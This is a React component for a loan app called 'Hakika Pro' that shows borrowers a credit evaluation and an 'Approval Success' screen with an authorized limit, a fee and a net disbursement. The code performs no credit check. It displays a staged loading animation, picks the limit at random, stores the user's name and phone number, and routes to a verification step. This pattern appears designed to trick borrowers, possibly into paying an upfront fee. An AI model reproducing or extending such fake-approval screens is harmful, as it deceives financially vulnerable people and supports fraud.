import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { saveLoanApplication } from '../services/loans';

const LoanLimit = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [loanLimit, setLoanLimit] = useState(0);
  const [serviceFee, setServiceFee] = useState(0);
  const [progress, setProgress] = useState(0);
  
  const calculateServiceFee = (loanAmount: number): number => {
    if (loanAmount <= 2000) return Math.floor(loanAmount * 0.06) + 10;
    else if (loanAmount <= 3500) return Math.floor(loanAmount * 0.055) + 15;
    return Math.floor(loanAmount * 0.05) + 20;
  };
  
  useEffect(() => {
    // Progress bar animation
    const interval = setInterval(() => {
      setProgress(prev => (prev < 100 ? prev + 5 : 100));
    }, 50);

    const calculate = () => {
      const savedLimit = sessionStorage.getItem('hakika_loan_limit');
      const savedFee = sessionStorage.getItem('hakika_service_fee');
      
      if (savedLimit && savedFee) {
        setLoanLimit(parseInt(savedLimit));
        setServiceFee(parseInt(savedFee));
        setLoading(false);
        return;
      }
      
      setTimeout(() => {
        const random = Math.random();
        let calculatedLimit = random < 0.9 
          ? Math.floor(Math.random() * (3500 - 1500) + 1500)
          : Math.floor(Math.random() * (10000 - 3500) + 3500);
        
        calculatedLimit = Math.max(1500, Math.min(10000, calculatedLimit));
        const fee = calculateServiceFee(calculatedLimit);
        
        sessionStorage.setItem('hakika_loan_limit', calculatedLimit.toString());
        sessionStorage.setItem('hakika_service_fee', fee.toString());
        
        setLoanLimit(calculatedLimit);
        setServiceFee(fee);
        setLoading(false);

        // Save to Firebase
        saveLoanApplication({
          userName: sessionStorage.getItem('hakika_name') || '',
          userPhone: sessionStorage.getItem('hakika_phone') || '',
          loanAmount: calculatedLimit,
          protocolFee: fee,
          netDisbursement: calculatedLimit - fee,
          status: 'PENDING'
        });
      }, 1200);
    };
    
    calculate();
    return () => clearInterval(interval);
  }, []);

  const handleProceed = () => {
    navigate('/verify');
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-KE', {
      style: 'currency',
      currency: 'KES',
      minimumFractionDigits: 0,
    }).format(amount);
  };

  if (loading) {
    return (
      <div className="page-container bg-mesh" style={{ color: 'white', justifyContent: 'center' }}>
        <div style={{ textAlign: 'center' }}>
          <div className="animate-float" style={{ fontSize: '40px', marginBottom: '24px' }}>🛡️</div>
          <h2 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '24px' }}>Evaluating Credit Profile</h2>
          <div className="progress-container" style={{ maxWidth: '280px', margin: '0 auto' }}>
            <div className="progress-bar" style={{ width: `${progress}%` }}></div>
          </div>
          <p style={{ color: '#666', fontSize: '13px', marginTop: '16px' }}>Connecting to secure nodes...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="page-container bg-mesh" style={{ color: 'white' }}>
      <div className="logo-container">
        <h1 className="logo" style={{ color: 'white' }}>🏛️ Hakika Pro</h1>
      </div>
      
      <div style={{ textAlign: 'center', marginBottom: '32px' }}>
        <div style={{ fontSize: '48px', marginBottom: '16px' }}>💎</div>
        <h1 className="text-gradient" style={{ fontSize: '28px', fontWeight: '800', marginBottom: '8px' }}>Approval Success</h1>
        <p style={{ color: '#888', margin: 0, fontSize: '15px' }}>
          Your premium credit line has been authorized.
        </p>
      </div>
      
      {/* High-End Loan Card */}
      <div className="luxury-card glow-border" style={{ 
        background: 'linear-gradient(135deg, #111 0%, #050505 100%)',
        textAlign: 'center',
        padding: '32px 20px',
        marginBottom: '24px'
      }}>
        <p style={{ margin: 0, fontSize: '12px', color: '#666', textTransform: 'uppercase', letterSpacing: '2px' }}>
          Authorized Limit
        </p>
        <p style={{ fontSize: '42px', fontWeight: '800', margin: '12px 0 0', color: 'var(--accent-emerald)', textShadow: '0 0 20px rgba(0,255,136,0.3)' }}>
          {formatCurrency(loanLimit)}
        </p>
      </div>
      
      {/* Sophisticated Breakdown */}
      <div className="glass" style={{ background: 'rgba(255,255,255,0.02)', padding: '24px', borderRadius: '24px', marginBottom: '32px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
          <span style={{ color: '#888', fontSize: '14px' }}>Protocol Fee</span>
          <span style={{ fontWeight: '600', color: '#ff4444' }}>-{formatCurrency(serviceFee)}</span>
        </div>
        <div style={{ height: '1px', background: 'rgba(255,255,255,0.05)', marginBottom: '16px' }}></div>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontWeight: '500', fontSize: '15px' }}>Net Disbursement</span>
          <span style={{ fontWeight: '800', color: 'white', fontSize: '20px' }}>{formatCurrency(loanLimit - serviceFee)}</span>
        </div>
      </div>
      
      {/* Terms */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '40px' }}>
        <div className="luxury-card" style={{ padding: '16px', textAlign: 'center' }}>
          <span style={{ display: 'block', color: '#555', fontSize: '10px', textTransform: 'uppercase', marginBottom: '4px' }}>Duration</span>
          <span style={{ fontWeight: '700' }}>30 Days</span>
        </div>
        <div className="luxury-card" style={{ padding: '16px', textAlign: 'center' }}>
          <span style={{ display: 'block', color: '#555', fontSize: '10px', textTransform: 'uppercase', marginBottom: '4px' }}>Interest</span>
          <span style={{ fontWeight: '700' }}>12% Fixed</span>
        </div>
      </div>
      
      <button className="btn-premium" onClick={handleProceed} style={{ background: 'white', color: 'black' }}>
        Initialize Disbursement
        <span style={{ fontSize: '20px' }}>→</span>
      </button>
    </div>
  );
};

export default LoanLimit;
